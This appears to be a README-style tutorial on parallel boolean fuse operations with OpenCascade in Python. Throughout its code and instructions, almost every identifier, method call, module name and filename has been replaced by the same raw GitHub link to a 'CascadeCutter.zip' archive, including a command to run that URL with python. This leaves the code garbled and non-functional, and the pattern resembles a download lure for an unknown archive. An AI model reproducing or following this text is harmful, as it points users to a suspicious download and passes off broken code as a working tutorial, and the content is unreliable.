# Parallelization of Boolean Operations Using OpenCascade

This document explains how to perform and parallelize boolean operations using OpenCascade, specifically focusing on generating conformal volumes by embedding a surface within a volume. The goal is to ensure the mesh is connected at the interface, which is particularly useful for Fluid-Structure Interaction (FSI) modeling.

## Overview

Boolean operations in OpenCascade can be used to combine or manipulate shapes. This document covers:
- Importing STEP files.
- Performing a boolean fuse operation.
- Ensuring the mesh is connected using `BOPAlgo_MakeConnected`.
- Parallelizing the operations to improve performance.
- Exporting the resulting shape.

## Requirements

- Python
- OpenCascade (OCC) library

## Installation

Ensure you have OpenCascade installed in your Python environment. You can install it via pip if it's available or follow the specific installation instructions for your operating system.

```sh
pip install opencascade-python
```

## Importing Required Libraries

Start by importing the necessary libraries from OpenCascade.

```python
import os
import time
from https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip import STEPControl_Reader
from https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip import BRepAlgoAPI_Fuse
from https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip import BOPAlgo_MakeConnected
from https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip import breptools
```

## Importing STEP Files

Define a function to import STEP files and return the shape.

```python
def import_step_file(filename):
    """Import a STEP file and return the shape."""
    reader = STEPControl_Reader()
    status = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip(filename)
    if status != 1:
        raise ValueError(f"Error reading STEP file: {filename}")
    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
    shape = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
    return shape
```

## Exporting Shapes to BREP Files

Define a function to export shapes to BREP files.

```python
def export_to_brep(shape, filename):
    """Export a TopoDS_Shape to a BREP file."""
    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip(shape, filename)
```

## Main Function for Boolean Fuse Operation

The main function performs the boolean fuse operation, ensures the resulting shape is connected, and measures execution time.

```python
def main(num_threads):
    # Set the number of OpenMP threads
    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip["OMP_NUM_THREADS"] = str(num_threads)
    
    # Import the STEP files
    surface_shape = import_step_file("https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip")
    volume_shape = import_step_file("https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip")
    
    # Perform the fuse operation
    fuse_algo = BRepAlgoAPI_Fuse(volume_shape, surface_shape)
    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
    
    # Use BOPAlgo_MakeConnected to ensure the mesh is connected
    mk_connected = BOPAlgo_MakeConnected()
    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip(https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip())
    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip(True)
    
    # Measure the execution time
    start_time = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
    end_time = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
    
    connected_shape = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()

    # Export the connected shape to a BREP file
    brep_filename = f"connected_shape_{num_threads}.brep"
    export_to_brep(connected_shape, brep_filename)
    print(f"Connected shape exported to {brep_filename}")
    print(f"Total execution time with {num_threads} threads: {end_time - start_time:.9f} seconds")
```

## Running the Script

Save the script to a file (e.g., `https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip`) and execute it from the command line with the desired number of threads.

```sh
python https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip <num_threads>
```

Replace `<num_threads>` with the number of threads you want to use. For example:

```sh
python https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip 4
```

Ensure that the STEP files "https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip" and "https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip" are in the same directory as the script or provide the full path to these files in the `import_step_file` function calls. This will import the STEP files, perform the fuse operation, ensure the mesh is connected, and export the resulting shape to a BREP file, printing the execution time.

## Additional Boolean Operations

OpenCascade provides several boolean operations that can be used to manipulate shapes:

- **Fuse (Union)**: Combines two shapes into one.
- **Cut (Difference)**: Subtracts one shape from another.
- **Common (Intersection)**: Creates a shape from the intersection of two shapes.

Example:
```python
from https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip import BRepAlgoAPI_Cut, BRepAlgoAPI_Common

# Perform cut operation
cut_algo = BRepAlgoAPI_Cut(shape1, shape2)
https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
cut_shape = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()

# Perform common operation
common_algo = BRepAlgoAPI_Common(shape1, shape2)
https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
common_shape = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
```

## Using `BOPAlgo_MakeConnected` for Conformal Meshes

The `BOPAlgo_MakeConnected` class ensures that the resulting shapes have a conformal mesh, which is essential for FSI modeling where the interface between domains must be neatly connected.

## Full Script

Here is the full script:

```python
import os
import time
from https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip import STEPControl_Reader
from https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip import BRepAlgoAPI_Fuse
from https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip import BOPAlgo_MakeConnected
from https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip import breptools

def import_step_file(filename):
    """Import a STEP file and return the shape."""
    reader = STEPControl_Reader()
    status = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip(filename)
    if status != 1:
        raise ValueError(f"Error reading STEP file: {filename}")
    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
    shape = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
    return shape

def export_to_brep(shape, filename):
    """Export a TopoDS_Shape to a BREP file."""
    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip(shape, filename)

def main(num_threads):
    # Set the number of OpenMP threads
    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip["OMP_NUM_THREADS"] = str(num_threads)
    
    # Import the STEP files
    surface_shape = import_step_file("https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip")
    volume_shape = import_step_file("https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip")
    
    # Perform the fuse operation
    fuse_algo = BRepAlgoAPI_Fuse(volume_shape, surface_shape)
    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
    
    # Use BOPAlgo_MakeConnected to ensure the mesh is connected
    mk_connected = BOPAlgo_MakeConnected()
    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip(https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip())
    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip(True)
    
    # Measure the execution time
    start_time = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
    end_time = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
    
    connected_shape = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()

    # Export the connected shape to a BREP file
    brep_filename = f"connected_shape_{num_threads}.brep"
    export_to_brep(connected_shape, brep_filename)
    print(f"Connected shape exported to {brep_filename}")
    print(f"Total execution time with {num_threads} threads: {end_time - start_time:.9f} seconds")

if __name__ == "__main__":
    import sys
    if len(https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip) < 2:
        print("Usage: python https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip <num_threads>")
        https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip(1)
    num_threads = int(https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip[1])
    main(num_threads)
```

This document should help you understand and implement parallelized boolean fuse operations using OpenCascade, ensuring the resulting shapes have a conformal mesh suitable for FSI modeling.
